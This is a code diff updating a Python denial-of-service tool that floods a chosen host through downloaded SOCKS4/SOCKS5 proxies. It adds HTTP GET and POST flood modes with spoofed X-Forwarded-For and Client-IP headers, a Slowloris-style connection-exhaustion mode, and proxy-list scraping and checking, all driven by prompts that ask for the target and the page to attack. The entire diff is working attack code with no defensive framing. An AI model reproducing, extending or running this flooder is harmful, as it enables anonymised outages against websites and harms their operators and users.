@@ -119,8 +119,6 @@ useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firef
 			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2",
 			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330",
 			"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)",
-			"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8",
-			"Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0",
 			"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)",
 			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
 			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
@@ -171,201 +169,245 @@ acceptall = [
 		"Accept-Language: en-US,en;q=0.5\r\n",
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
 		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
-
-def cc():
-	get_host = "GET " + url2 + "?=" + str(random.randint(0,20000)) + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+def cc(socks_type):
 	connection = "Connection: Keep-Alive\r\n"
 	useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
 	accept = random.choice(acceptall)
 	referer = "Referer: https://www.google.com/search?q="+ ip + url2 + "\r\n"
-	request = get_host + referer + useragent + accept + connection + "\r\n"
 	proxy = random.choice(proxies).strip().split(":")
+	if socks_type == 4:
+		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+	if socks_type == 5:
+		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+	err = 0
+	if str(port) == "443" :
+		n = "HTTPS"
+	else:
+		n = "CC"
 	while True:
+		get_host = "GET " + url2 + "?" + str(random.randint(0,20000)) + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+		fake_ip = "X-Forwarded-For: "+str(random.randint(1,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"\r\n"
+		fake_ip += "Client-IP: "+str(random.randint(1,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"\r\n"
+		request = get_host + referer + useragent + accept + connection + fake_ip+"\r\n"
 		try:
-			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+			if err > 3:
+				print("[!] Target Or Proxy Maybe Down | Changing Proxy")
+				break
 			s = socks.socksocket()
 			s.connect((str(ip), int(port)))
 			if str(port) == '443':
 				s = ssl.wrap_socket(s)
-				n = "HTTPS"
-			else:
-				n = "CC"
 			s.send(str.encode(request))
-			print ("[*] "+n+" Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
+			print ("[*] "+n+" Flooding From | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
-				for y in range(multiple):
+				for _ in range(multiple):
 					s.send(str.encode(request))
+				#s.close()
 			except:
 				s.close()
 		except:
 			s.close()
-			try:
-				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
-				s.connect((str(ip), int(port)))
-				if str(port) == '443':
-					s = ssl.wrap_socket(s)
-					n = "HTTPS"
-				else:
-					n = "CC"
-				s.send(str.encode(request))
-				print ("[*] "+n+" Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
-				try:
-					for y in range(multiple):
-						s.send(str.encode(request))
-				except:
-					s.close()
-			except:
-				print ("[!] Connection Error")
-				s.close()
-
-def post():
-	post_host = "POST " + url2 + "?=" + str(random.randint(0,20000)) + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+			err = err +1
+	cc(socks_type)
+def post(socks_type):
+	post_host = "POST " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 	content = "Content-Type: application/x-www-form-urlencoded\r\n"
-	length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+	length = "Content-Length: 16 \r\nConnection: Keep-Alive\r\n"
 	refer = "Referer: http://"+ ip + url2 + "\r\n"
 	user_agent = "User-Agent: " + random.choice(useragents) + "\r\n"
 	accept = random.choice(acceptall)
-	#data = str(random._urandom(16)) // You can enable bring data in HTTP Header
-	request = post_host + accept + refer + content + user_agent + length + "\r\n"# + data 
+	data = str(random._urandom(16)) # You can enable bring data in HTTP Header
+	request = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
 	proxy = random.choice(proxies).strip().split(":")
+	if socks_type == 4:
+		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+	if socks_type == 5:
+		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+	err = 0
+	if str(port) == "443" :
+		n = "HTTPS"
+	else:
+		n = "CC"
 	while True:
 		try:
-			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+			if err > 3:
+				print("[!] Target Or Proxy Maybe Down | Changing Proxy")
+				break
 			s = socks.socksocket()
 			s.connect((str(ip), int(port)))
 			if str(port) == '443': # //AUTO Enable SSL MODE :)
 				s = ssl.wrap_socket(s)
-			else:
-				pass
 			s.send(str.encode(request))
-			print ("[*] HTTP Post Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
+			print ("[*] "+n+" Post Flooding From  | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
-				for y in range(multiple):
+				for _ in range(multiple):
 					s.send(str.encode(request))
+				#s.close()
 			except:
 				s.close()
 		except:
 			s.close()
+			err = err + 1
+	post(socks_type)
+
+socket_list=[]
+def slow(conn,socks_type):
+	for _ in range(conn):
+		proxy = random.choice(proxies).strip().split(":")
+		if socks_type == 4:
+			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+		if socks_type == 5:
+			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+		try:
+			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+			s = socks.socksocket()
+			s.settimeout(0.6)
+			s.connect((str(ip), int(port)))
+			if str(port) == '443':
+				s = ssl.wrap_socket(s)
+			s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))# Slowloris format header
+			s.send("User-Agent: {}\r\n".format(random.choice(useragents)).encode("utf-8"))
+			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
+			s.send(("Connection:keep-alive").encode("utf-8"))
+			socket_list.append(s)
+			sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
+			sys.stdout.flush()
+		except:
+			s.close()
+			sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
+			sys.stdout.flush()
+	while True:
+		for s in list(socket_list):
 			try:
+				s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+				sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
+				sys.stdout.flush()
+			except:
+				s.close()
+				socket_list.remove(s)
+				sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
+				sys.stdout.flush()
+		for _ in range(conn - len(socket_list)):
+			proxy = random.choice(proxies).strip().split(":")
+			if socks_type == 4:
 				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
-				s = socks.socksocket()
+			if socks_type == 5:
+				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+			try:
+				s.settimeout(1)
 				s.connect((str(ip), int(port)))
 				if str(port) == '443':
 					s = ssl.wrap_socket(s)
-				else:
-					pass
-				s.send(str.encode(request))
-				print ("[*] HTTP Post Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
-				try:
-					for y in range(multiple):
-						s.send(str.encode(request))
-				except:
-					s.close()
+				s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))# Slowloris format header
+				s.send("User-Agent: {}\r\n".format(random.choice(useragents)).encode("utf-8"))
+				s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
+				s.send(("Connection:keep-alive").encode("utf-8"))
+				socket_list.append(s)
+				sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
+				sys.stdout.flush()
 			except:
-				print ("[!] Connection Error")
-				s.close()
-socket_list=[]
-def slow(conn):
-	for _ in range(conn):
-		proxy = random.choice(proxies).strip().split(":")
-		try:
-			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
-			s = socks.socksocket()
-			s.settimeout(1)
-			s.connect((str(ip), int(port)))
-			if str(port) == '443':
-				s = ssl.wrap_socket(s)
-			s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))# Slowloris format header
-			s.send("User-Agent: {}\r\n".format(random.choice(useragents)).encode("utf-8"))
-			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
-			s.send(("Connection:keep-alive").encode("utf-8"))
-			socket_list.append(s)
-			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
-			sys.stdout.flush()
-		except:
-			s.close()
-			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
-			sys.stdout.flush()
-	for s in list(socket_list):
-			s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
-			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
-			sys.stdout.flush()
-	for _ in range(conn - len(socket_list)):
-		proxy = random.choice(proxies).strip().split(":")
-		try:
-			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
-			s = socks.socksocket()
-			s.settimeout(1)
-			s.connect((str(ip), int(port)))
-			if str(port) == '443':
-				s = ssl.wrap_socket(s)
-			s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))# Slowloris format header
-			s.send("User-Agent: {}\r\n".format(random.choice(useragents)).encode("utf-8"))
-			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
-			s.send(("Connection:keep-alive").encode("utf-8"))
-			socket_list.append(s)
-			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
-			sys.stdout.flush()
-		except:
-			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
-			sys.stdout.flush()
-			pass
-def checking(lines):
+				sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
+				sys.stdout.flush()
+				pass
+nums = 0
+def checking(lines,socks_type,ms):#Proxy checker coded by root@bossy:~# 
 	global nums
 	global proxies
 	proxy = lines.strip().split(":")
-	try:
+	if socks_type == 4:
+		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+	if socks_type == 5:
 		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
-		s = socks.socksocket()
-		s.settimeout(0.5)#500ms
-		s.connect((str(ip), int(port)))
-		if port == 443:
-			s = ssl.wrap_socket(s)
-		s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
-		s.close()
-	except:
-		proxies.remove(lines)
-	nums = nums + 1
+	err = 0
+	while True:
+		if err == 3:
+			proxies.remove(lines)
+			break
+		try:
+			s = socks.socksocket()
+			s.settimeout(ms)#You can change by yourself
+			s.connect((str(ip), int(port)))
+			if port == 443:
+				s = ssl.wrap_socket(s)
+			s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
+			s.close()
+			break
+		except:
+			err +=1
+	nums += 1
 
-def check_socks():
-	global proxies
+def check_socks(ms):#Coded by root@bossy:~# 
 	global nums
-	nums = 0
 	thread_list=[]
 	for lines in list(proxies):
-		th = threading.Thread(target=checking,args=(lines,))
-		th.start()
+		if choice == "5":
+			th = threading.Thread(target=checking,args=(lines,5,ms,))
+			th.start()
+		if choice == "4":
+			th = threading.Thread(target=checking,args=(lines,5,ms,))
+			th.start()
 		thread_list.append(th)
-		time.sleep(0.1)
-		sys.stdout.write("root@bossy:~# Checked "+str(nums)+" proxies\r")
+		time.sleep(0.01)
+		sys.stdout.write("root@bossy:~# Checked "+str(nums)+" Proxies\r")
 		sys.stdout.flush()
 	for th in list(thread_list):
 		th.join()
-		sys.stdout.write("root@bossy:~# Checked "+str(nums)+" proxies\r")
+		sys.stdout.write("root@bossy:~# Checked "+str(nums)+" Proxies\r")
 		sys.stdout.flush()
-	print("\r\nroot@bossy:~# Checked All Proxies Total Worked :"+str(len(proxies)))
-	ans = input("root@bossy:~# Do U Want To Save Them In A File ? ( y/n ) ")
-	if ans == "y":
-		in_file = str(input("root@bossy:~# Input Your Filename ( socks.txt ) : "))
-		if in_file == "":
-			in_file = "socks.txt"
-		with open(in_file, 'wb') as fp:
-			for lines in list(proxies):
-				fp.write(bytes(lines,encoding='utf8'))
-		fp.close()
+	print("\r\nroot@bossy:~# Checked All Proxies , Total Worked :"+str(len(proxies)))
+	ans = input("root@bossy:~# Do U Want To Save Them In A File ? ( y / n , Default = y )")
+	if ans == "y" or ans == "":
+		if choice == "4":
+			with open("socks4.txt", 'wb') as fp:
+				for lines in list(proxies):
+					fp.write(bytes(lines,encoding='utf8'))
+			fp.close()
+			print("root@bossy:~# They Are Saved In socks4.txt.")
+		elif choice == "5":
+			with open("socks5.txt", 'wb') as fp:
+				for lines in list(proxies):
+					fp.write(bytes(lines,encoding='utf8'))
+			fp.close()
+			print("root@bossy:~# They Are Saved In socks5.txt.")
+			
+def check_list(socks_file):
+	print("> Checking list")
+	temp = open(socks_file).readlines()
+	temp_list = []
+	for i in temp:
+		if i not in temp_list:
+			temp_list.append(i)
+	rfile = open(socks_file, "wb")
+	for i in list(temp_list):
+		rfile.write(bytes(i,encoding='utf-8'))
+	rfile.close()
+
 def main():
 	global ip
 	global url2
 	global port
 	global proxies
 	global multiple
-	mode = str(input("root@bossy:~# Choose Your Mode (cc/post/slow) : "))
-	ip = str(input("root@bossy:~# [Host/Ip] : "))
-	if mode == "slow":
+	global choice
+	ip = ""
+	port = ""
+	print("root@bossy:~# Mode : [ cc / post / slow / check ]")
+	mode = str(input("root@bossy:~# Choose Your Mode ( Default = cc ) :"))
+	if mode == "":
+		mode = "cc"
+	ip = str(input("root@bossy:~# Host/IP : "))
+	if ip == "":
+		print("root@bossy:~# Plese Enter Correct Host Or Ip")
+		sys.exit(0)
+	if mode == "slow" or mode == "check":
 		pass
 	else:
-		url = str(input("root@bossy:~# Page You Want To Attack ( default=/ ) : "))
-	port = str(input("root@bossy:~# Port ( Https Default Is 443 ) : "))
+		url = str(input("root@bossy:~# Page You Want To Attack ( Default = / ) : "))
+		if url == "":
+			url2 = "/"
+		else:
+			url2 = url
+	port = str(input("root@bossy:~# Port ( HTTPS Is 443 ) : "))
 	if port == '':
 		port = int(80)
 		print("root@bossy:~# Default Choose Port 80\r\n> Port 80 Was Chosen")
@@ -373,44 +415,189 @@ def main():
 		port = int(port)
 		if str(port) == '443':
 			print("root@bossy:~# [!] Enable SSL Mode")
-	thread_num = int(input("root@bossy:~# Threads : "))
-	N = str(input("root@bossy:~# Do You Need To Get Socks5 List ? (Y/n) : "))
-	if N == 'y':
-		r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all")
-		with open("socks.txt",'wb') as f:
-			f.write(r.content)
-			print("\r\nroot@bossy:~# [!] Have Already Download Socks5 List As socks.txt\r\n")
+	choice = ""
+	while choice == "":
+		choice = str(input("root@bossy:~# Choose Your Socks Mode ( 4 / 5 , Default = 5 ) : ")).strip()
+		if choice == "":
+			choice = "5"
+		if choice != "4" and choice != "5":
+			print("> [!] Error Choice try again")
+		if choice == "4":
+			socks_type = 4
+		else:
+			socks_type = 5
+	if mode == "check":
+		N = str(input("root@bossy:~# Do You Need To Get Socks List ? ( y / n , Default = y ) : "))
+		if N == 'y' or N == "" :
+			if choice == "4":
+				f = open("socks4.txt",'wb')
+				try:
+					r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all&timeout=1000")
+					f.write(r.content)
+				except:
+					pass
+				try:
+					r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4")
+					f.write(r.content)
+					f.close()
+				except:
+					f.close()
+				print("root@bossy:~# Have Already Downloaded Socks4 List As socks4.txt")
+			if choice == "5":
+				f = open("socks5.txt",'wb')
+				try:
+					r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all")
+					f.write(r.content)
+				except:
+					pass
+				try:
+					r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5")
+					f.write(r.content)
+					f.close()
+				except:
+					f.close()
+				print("root@bossy:~# Have Already Downloaded Socks5 List As socks5.txt")
+		else:
+			pass
+		if choice == "4":
+			out_file = str(input("root@bossy:~# Socks4 Proxy File Path ( socks4.txt ) : "))
+			if out_file == '':
+				out_file = str("socks4.txt")
+			else:
+				out_file = str(out_file)
+			check_list(out_file)
+			proxies = open(out_file).readlines()
+		elif choice == "5":
+			out_file = str(input("root@bossy:~# Socks5 Proxy File Path ( socks5.txt ) : "))
+			if out_file == '':
+				out_file = str("socks5.txt")
+			else:
+				out_file = str(out_file)
+			check_list(out_file)
+			proxies = open(out_file).readlines()
+		print ("root@bossy:~# Number Of Socks %s Proxies : %s" %(choice,len(proxies)))
+		time.sleep(0.03)
+		ans = str(input("root@bossy:~# Do U Need To Check The Socks List ? ( y / n , Defualt = y ) : "))
+		if ans == "":
+			ans = "y"
+		if ans == "y":
+			ms = str(input("root@bossy:~# Delay Of Socks ( Seconds , Default = 1 ) : "))
+			if ms == "":
+				ms = int(1)
+			else :
+				try:
+					ms = int(ms)
+				except :
+					ms = float(ms)
+			check_socks(ms)
+		print("root@bossy:~# End Of Process")
+		return
+	if mode == "slow":	
+		thread_num = str(input("root@bossy:~# Connections ( Default = 400 ) : "))
+	else:
+		thread_num = str(input("root@bossy:~# Threads ( Default = 400 ) : "))
+	if thread_num == "":
+		thread_num = int(400)
+	else:
+		try:
+			thread_num = int(thread_num)
+		except:
+			sys.exit("Error Thread Number")
+	N = str(input("root@bossy:~# Do You Need To Get Socks List ? ( y / n , Default = y ) : "))
+	if N == 'y' or N == "" :
+		if choice == "4":
+			f = open("socks4.txt",'wb')
+			try:
+				r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all&timeout=1000")
+				f.write(r.content)
+			except:
+				pass
+			try:
+				r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4")
+				f.write(r.content)
+				f.close()
+			except:
+				f.close()
+			print("root@bossy:~# Have Already Downloaded Socks4 List As socks4.txt")
+		if choice == "5":
+			f = open("socks5.txt",'wb')
+			try:
+				r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all")
+				f.write(r.content)
+			except:
+				pass
+			try:
+				r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5")
+				f.write(r.content)
+				f.close()
+			except:
+				f.close()
+			print("root@bossy:~# Have Already Downloaded Socks5 List As socks5.txt")
 	else:
 		pass
-	out_file = str(input("root@bossy:~# Proxy File Path ( socks.txt ) : "))
-	if out_file == '':
-		out_file = str("socks.txt")
-	else:
-		out_file = str(out_file)
-	proxies = open(out_file).readlines()
-	print ("root@bossy:~# Number Of Proxies : %s" %(len(proxies)))
+	if choice == "4":
+		out_file = str(input("root@bossy:~# Socks4 Proxy File Path ( socks4.txt ) : "))
+		if out_file == '':
+			out_file = str("socks4.txt")
+		else:
+			out_file = str(out_file)
+		check_list(out_file)
+		proxies = open(out_file).readlines()
+	elif choice == "5":
+		out_file = str(input("root@bossy:~# Socks5 Proxy File Path ( socks5.txt ) : "))
+		if out_file == '':
+			out_file = str("socks5.txt")
+		else:
+			out_file = str(out_file)
+		check_list(out_file)
+		proxies = open(out_file).readlines()
+	print ("root@bossy:~# Number Of Socks %s Proxies : %s" %(choice,len(proxies)))
 	time.sleep(0.03)
-	ans = str(input("root@bossy:~# Do U Need To Check Socks List ? (Y/n) "))
+	ans = str(input("root@bossy:~# Do U Need To Check The Socks List ? ( y / n , Defualt = y ) : "))
+	if ans == "":
+		ans = "y"
 	if ans == "y":
-		check_socks()
+		ms = str(input("root@bossy:~# Delay Of Socks ( Seconds , Default = 1 ) : "))
+		if ms == "":
+			ms = int(1)
+		else :
+			try:
+				ms = int(ms)
+			except :
+				ms = float(ms)
+		check_socks(ms)
 	if mode == "slow":
-		slow(thread_num)
-	multiple = int(input("root@bossy:~# Input The Magnification (100) : "))
-	if url == '':
-		url2 = "/"
+		input("root@bossy:~# Press Enter To Continue.")
+		th = threading.Thread(target=slow,args=(thread_num,socks_type,))
+		th.setDaemon(True)
+		th.start()
 	else:
-		url2 = str(url)
-	if mode == "post":
-		for i in range(thread_num):
-			th = threading.Thread(target = post)
-			th.start()
-	elif mode == "cc":
-		for i in range(thread_num):
-			th = threading.Thread(target = cc)
-			th.start()
-	else:
-		print("root@bossy:~# [!] Input Error")
+		multiple = str(input("root@bossy:~# Input The Magnification ( Default = 100 ) : "))
+		if multiple == "":
+			multiple = int(100)
+		else:
+			multiple = int(multiple)
+		input("root@bossy:~# Press Enter To Continue.")
+		if mode == "post":
+			for _ in range(thread_num):
+				th = threading.Thread(target = post,args=(socks_type,))
+				th.setDaemon(True)
+				th.start()
+				time.sleep(0.03)
+				#print("Threads "+str(i+1)+" created")
+		elif mode == "cc":
+			for _ in range(thread_num):
+				th = threading.Thread(target = cc,args=(socks_type,))
+				th.setDaemon(True)
+				th.start()
+				time.sleep(0.03)
+					#print("Threads "+str(i+1)+" created")
+	try:
+		while True:
+			pass
+	except KeyboardInterrupt:
 		sys.exit()
+	
 
 if __name__ == "__main__":
 	main()
